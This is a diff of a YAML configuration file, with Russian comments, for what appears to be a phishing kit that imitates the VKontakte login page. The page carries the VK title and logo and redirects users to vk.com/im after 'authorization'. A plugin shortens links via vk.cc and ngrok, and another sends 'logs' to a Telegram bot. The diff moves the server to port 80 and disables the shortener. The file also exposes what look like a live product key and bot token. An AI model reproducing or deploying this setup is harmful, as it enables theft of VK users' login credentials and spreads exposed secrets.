@@ -3,7 +3,7 @@
 title: Вход | ВКонтакте # Заголовок страницы index.html
 image: https://vk.com/images/brand/vk-logo.png # Превью-картинка страницы
 exit: https://vk.com/im # Куда перенаправлять после авторизации
-port: 3000 # На каком порту работает сервер
+port: 80 # На каком порту работает сервер
 productKey: "8862844621853585:AcgC3u9BSmvxB+Hw5nynrwssmK4TfCtstYjJoecv3xUUQNtXsJ+TKwJdWFIQ9LQffxXM6q6CSurGkTVa2+jacOvFAW/7QRdS1YQzxCh45vzuIR09ptgAjlCkEtxg6CAkGHTrurGiYK3SK/DGGdPWC7A6qvTHcgDAmA4jCQHz/UhsXsbm"
 
 proxy:
@@ -28,7 +28,7 @@ plugins: # Плагины и их настройки
 
   vkcc: # Плагин сокращения ссылок vk.cc, работает в связке с ngrok
     tokens: [] # Default tokens for links shortening (can also be apps & groups)
-    enabled: true # `true` включен, `false` выключен
+    enabled: false # `true` включен, `false` выключен
 
   telegram: # Плагин отправки логов в телеграм
     token: "6332159570:AAGsGonnJucr73JxA0Eo5hcqDrtklzwWghU" # Токен бота
